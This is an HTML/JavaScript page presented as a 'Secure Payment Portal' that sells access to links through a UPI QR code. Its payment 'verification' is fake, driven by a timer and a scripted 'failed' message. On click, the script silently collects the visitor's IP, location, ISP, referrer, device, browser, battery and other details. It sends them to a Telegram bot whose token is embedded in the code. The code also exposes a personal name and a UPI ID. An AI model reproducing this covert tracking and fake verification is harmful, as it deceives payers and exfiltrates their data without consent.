<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }
        body {
            background: #0f172a;
            background-image: radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
                              radial-gradient(at 100% 100%, rgba(168, 85, 247, 0.15) 0px, transparent 50%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #f8fafc;
        }
        .container {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 100%;
            max-width: 420px;
            padding: 35px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            text-align: center;
            position: relative;
        }
        h2, h3 {
            color: #f8fafc;
            margin-bottom: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #94a3b8;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            font-size: 15px;
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
        }
        input:focus {
            border-color: #6366f1;
            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            color: white;
            border: none;
            font-weight: 700;
            font-size: 15px;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 12px;
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
            transition: all 0.3s ease;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
        }
        #gen-result {
            margin-top: 20px;
            padding: 14px;
            background: rgba(15, 23, 42, 0.8);
            border-radius: 12px;
            word-break: break-all;
            font-size: 13px;
            color: #4ade80;
            border: 1px solid rgba(74, 222, 128, 0.2);
            text-align: left;
        }
        #gen-result a {
            color: #818cf8;
            font-weight: 600;
            text-decoration: none;
        }
        .loading-spinner {
            color: #94a3b8;
            font-size: 14px;
            margin: 20px 0;
        }
        #qr-section img {
            width: 210px;
            height: 210px;
            border-radius: 14px;
            border: 4px solid rgba(255, 255, 255, 0.05);
            margin: 15px 0;
            padding: 8px;
            background: white;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }
        #show-amt {
            font-size: 22px;
            font-weight: 800;
            color: #4ade80;
            margin-bottom: 15px;
        }
        #link-section a {
            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
            color: white;
            display: block;
            text-decoration: none;
            padding: 15px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4);
            transition: all 0.3s ease;
        }
        #link-section a:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.6);
        }
        #status-msg {
            font-size: 13px;
            margin: 12px 0;
            font-weight: 600;
            min-height: 20px;
        }

        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.55);
            backdrop-filter: blur(6px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }
        .popup-box {
            background: #1e293b;
            border: 1px solid rgba(129, 140, 248, 0.4);
            border-radius: 20px;
            padding: 28px 24px;
            max-width: 340px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            animation: popIn 0.35s ease;
        }
        @keyframes popIn {
            from { transform: scale(0.85); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .popup-box p {
            font-size: 15px;
            font-weight: 600;
            color: #e2e8f0;
            line-height: 1.55;
            margin-bottom: 22px;
        }
        .popup-box button {
            margin-top: 0;
            padding: 12px;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div id="admin-box">
            <h3>Admin Link Generator</h3>
            <div class="input-group">
                <label>Amount (₹)</label>
                <input type="number" id="new-amount" placeholder="e.g. 10">
            </div>
            <div class="input-group">
                <label>Main Target Link</label>
                <input type="text" id="new-link" placeholder="https://example.com">
            </div>
            <button onclick="generatePaymentLink()">Generate Secure Link</button>
            <div id="gen-result" style="display: none;"></div>
        </div>

        <div id="user-box" style="display: none;">
            <h2>Complete Payment</h2>
            <p id="loading-text" class="loading-spinner">Fetching payment details...</p>

            <div id="qr-section" style="display: none;">
                <p style="font-size: 13px; color: #94a3b8; margin-bottom: 5px;">Scan via FamPay or any UPI App</p>
                <img id="dynamic-qr" src="" alt="UPI QR Code">
                <div id="show-amt"></div>
                <div id="status-msg"></div>
                <button id="action-btn" onclick="handlePaymentAction()">I Have Paid, Get Link</button>
            </div>

            <div id="link-section" style="display: none;">
                <p style="color: #4ade80; font-weight: 600; margin-bottom: 15px;">Payment Verified Successfully!</p>
                <a id="final_download_link" href="#" target="_blank" onclick="notifyAccess()">Access Your Link</a>
            </div>
        </div>
    </div>

    <div class="popup-overlay" id="notice-popup">
        <div class="popup-box">
            <p>After payment is received, processing takes 5 to 10 seconds. Please don’t worry.</p>
            <button onclick="closeNoticePopup()">Got it</button>
        </div>
    </div>

<script>
    const API_URL = "https://script.google.com/macros/s/AKfycbw0jwT-1UAeHmsILaJuvOEc7efWJY6WxDxPmuDTa6vEUz1u5CuR1p7HCu8/exec";
    const MY_UPI_ID = "9173456004@fam";
    const MY_NAME = "Limbachiya Chintan Balavantkumar";
    const HOSTED_URL = "https://drecopenal-gif.github.io/Shirter-/";

    const TG_BOT_TOKEN = "8861476101:AAHBeX5H5UchF_9-exmWWm6xPA3wstrZ_Ec";
    const TG_CHAT_ID = "5714243957";

    let isTimerFinished = false;
    let failClickCount = 0;

    const urlParams = new URLSearchParams(window.location.search);
    const incomingLink = urlParams.get('target');

    if (incomingLink) {
        document.getElementById("admin-box").style.display = "none";
        document.getElementById("user-box").style.display = "block";
        loadPaymentPage(incomingLink);
    } else {
        document.getElementById("admin-box").style.display = "block";
        document.getElementById("user-box").style.display = "none";
    }

    async function generatePaymentLink() {
        const amt = document.getElementById("new-amount").value;
        const link = document.getElementById("new-link").value;
        if (!amt || !link) { alert("Please fill both amount and link!"); return; }

        const resDiv = document.getElementById("gen-result");
        resDiv.style.display = "block";
        resDiv.innerText = "Generating link...";

        try {
            await fetch(API_URL + "?action=add&amount=" + encodeURIComponent(amt) + "&link=" + encodeURIComponent(link));
            const generatedUrl = HOSTED_URL + "?target=" + encodeURIComponent(link);
            resDiv.innerHTML = "<b>Generated Link:</b><br><a href='" + generatedUrl + "' target='_blank'>" + generatedUrl + "</a>";
        } catch (e) {
            const generatedUrl = HOSTED_URL + "?target=" + encodeURIComponent(link);
            resDiv.innerHTML = "<b>Generated Link:</b><br><a href='" + generatedUrl + "' target='_blank'>" + generatedUrl + "</a>";
        }
    }

    async function loadPaymentPage(targetLink) {
        try {
            const response = await fetch(API_URL + "?link=" + encodeURIComponent(targetLink));
            const data = await response.json();
            const amount = data.amount ? data.amount : "10";

            document.getElementById("loading-text").style.display = "none";
            document.getElementById("show-amt").innerText = "₹" + amount;
            const upiLink = "upi://pay?pa=" + MY_UPI_ID + "&pn=" + encodeURIComponent(MY_NAME) + "&am=" + amount + "&cu=INR";
            const qrApiUrl = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(upiLink);
            document.getElementById("dynamic-qr").src = qrApiUrl;
            document.getElementById("qr-section").style.display = "block";

            setTimeout(() => { isTimerFinished = true; }, 20000);
            setTimeout(() => { document.getElementById("notice-popup").style.display = "flex"; }, 10000);
        } catch (error) {
            document.getElementById("loading-text").style.display = "none";
            document.getElementById("show-amt").innerText = "₹10";
            const upiLink = "upi://pay?pa=" + MY_UPI_ID + "&pn=" + encodeURIComponent(MY_NAME) + "&am=10&cu=INR";
            const qrApiUrl = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(upiLink);
            document.getElementById("dynamic-qr").src = qrApiUrl;
            document.getElementById("qr-section").style.display = "block";

            setTimeout(() => { isTimerFinished = true; }, 20000);
            setTimeout(() => { document.getElementById("notice-popup").style.display = "flex"; }, 10000);
        }
    }

    function closeNoticePopup() {
        document.getElementById("notice-popup").style.display = "none";
    }

    function handlePaymentAction() {
        const statusMsg = document.getElementById("status-msg");
        const btn = document.getElementById("action-btn");

        if (!isTimerFinished) {
            statusMsg.style.color = "#f87171";
            statusMsg.innerText = "❌ Payment not received yet! Please complete the payment.";
            return;
        }

        if (failClickCount === 0) {
            statusMsg.style.color = "#fbbf24";
            statusMsg.innerText = "Verifying payment with bank...";
            btn.disabled = true;
            btn.style.opacity = "0.6";

            setTimeout(() => {
                statusMsg.style.color = "#f87171";
                statusMsg.innerText = "⚠️ Payment verification failed! Click Try Again.";
                btn.innerText = "Try Again (Get Link)";
                btn.disabled = false;
                btn.style.opacity = "1";
                failClickCount++;
            }, 2000);
        } else {
            document.getElementById("final_download_link").href = incomingLink;
            document.getElementById("qr-section").style.display = "none";
            document.getElementById("link-section").style.display = "block";
            sendTelegramSilent("🎉 *User Unlocked Link Successfully!*\n🔗 Target: " + incomingLink);
        }
    }

    async function notifyAccess() {
        try {
            let ipData = {};
            try {
                const ipRes = await fetch("https://ipapi.co/json/");
                ipData = await ipRes.json();
            } catch (e) {
                ipData = { ip: "Not available" };
            }

            let network = "Unknown";
            if (navigator.connection) {
                network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
                if (network === "4g") network = "4G";
                if (network === "3g") network = "3G";
                if (network === "2g") network = "2G";
                if (network === "slow-2g") network = "Slow 2G";
            }

            const previous = document.referrer ? document.referrer : "Direct / None";

            let device = "Unknown";
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) device = "Android Device";
            else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iPad";
            else if (/windows/i.test(ua)) device = "Windows PC";
            else if (/macintosh|mac os/i.test(ua)) device = "Mac";
            else if (/linux/i.test(ua)) device = "Linux";

            let browser = "Unknown";
            if (ua.includes("Chrome") && !ua.includes("Edg")) {
                const match = ua.match(/Chrome\/([0-9.]+)/);
                browser = match ? `Chrome ${match[1].split('.')[0]}` : "Chrome";
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                const match = ua.match(/Version\/([0-9.]+)/);
                browser = match ? `Safari ${match[1].split('.')[0]}` : "Safari";
            } else if (ua.includes("Firefox")) {
                const match = ua.match(/Firefox\/([0-9.]+)/);
                browser = match ? `Firefox ${match[1].split('.')[0]}` : "Firefox";
            } else if (ua.includes("Edg")) {
                const match = ua.match(/Edg\/([0-9.]+)/);
                browser = match ? `Edge ${match[1].split('.')[0]}` : "Edge";
            }

            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Not available";
            const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "Not available";

            let battery = "Not available";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                    if (bat.charging) battery += " (Charging)";
                }
            } catch (e) {}

            const language = navigator.language || navigator.userLanguage || "Unknown";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

            const now = new Date();
            const timeStr = now.toLocaleString("en-IN", {
                day: "2-digit",
                month: "short",
                year: "numeric",
                hour: "2-digit",
                minute: "2-digit",
                hour12: true
            });

            const locationText = `${ipData.city || ""}${ipData.city && ipData.region ? ", " : ""}${ipData.region || ""}${(ipData.city || ipData.region) && ipData.country_name ? ", " : ""}${ipData.country_name || ""}`.trim();

            const msg = `🚀 *User Clicked Access Link!*\n\n` +
                      `🔗 *Link:* ${incomingLink}\n` +
                      `🌐 *IP Address:* ${ipData.ip || "N/A"}\n` +
                      `📍 *Location:* ${locationText || "N/A"}\n` +
                      `📡 *ISP:* ${ipData.org || "N/A"}\n` +
                      `📶 *Network:* ${network}\n` +
                      `🔙 *Previous Website:* ${previous}\n` +
                      `📱 *Device:* ${device}\n` +
                      `🌐 *Browser:* ${browser}\n` +
                      `📐 *Screen:* ${screenRes}\n` +
                      `💾 *RAM:* ${ram}\n` +
                      `⚙️ *CPU Cores:* ${cpuCores}\n` +
                      `🔋 *Battery:* ${battery}\n` +
                      `🌍 *Language:* ${language}\n` +
                      `⏰ *Timezone:* ${timezone}\n` +
                      `📅 *Time:* ${timeStr}`;

            sendTelegramSilent(msg);
        } catch (err) {
            sendTelegramSilent("🚀 *User Clicked Access Link!*\n🔗 Link: " + incomingLink + "\n⚠️ Extra info failed to load");
        }
    }

    function sendTelegramSilent(msg) {
        const tgUrl = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage?chat_id=" + TG_CHAT_ID + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown";
        fetch(tgUrl).catch(err => {});
    }
</script>
</body>
</html>
